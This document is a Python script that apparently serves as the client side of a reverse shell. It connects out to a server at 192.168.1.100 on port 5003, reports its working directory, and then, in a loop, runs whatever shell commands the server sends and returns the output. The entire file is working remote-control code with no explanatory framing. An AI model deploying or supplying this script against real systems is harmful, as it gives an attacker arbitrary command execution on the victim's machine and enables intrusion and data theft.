import socket
import os
import subprocess
import sys

server_host = "192.168.1.100"
server_port = 5003
buffer_size = 1024 * 128
separator = "<sep>"

# Create the socket object with error handling
try:
    s = socket.socket()
    s.connect((server_host, server_port))
except socket.error as e:
    print(f"Error connecting to the server: {e}")
    sys.exit()

# Get the current directory
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    try:
        # Receive the command from the server
        command = s.recv(buffer_size).decode()
    except socket.error as e:
        print(f"Error receiving data: {e}")
        break

    splited_command = command.split()
    if command.lower() == "exit":
        # If the command is exit, break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # Change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        # Execute the command and retrieve the results
        output = subprocess.getoutput(command)

    # Get the current working directory
    cwd = os.getcwd()

    # Send the results back to the server
    message = f"{output}{separator}{cwd}"
    try:
        s.send(message.encode())
    except socket.error as e:
        print(f"Error sending data: {e}")
        break

# Close client connection
s.close()
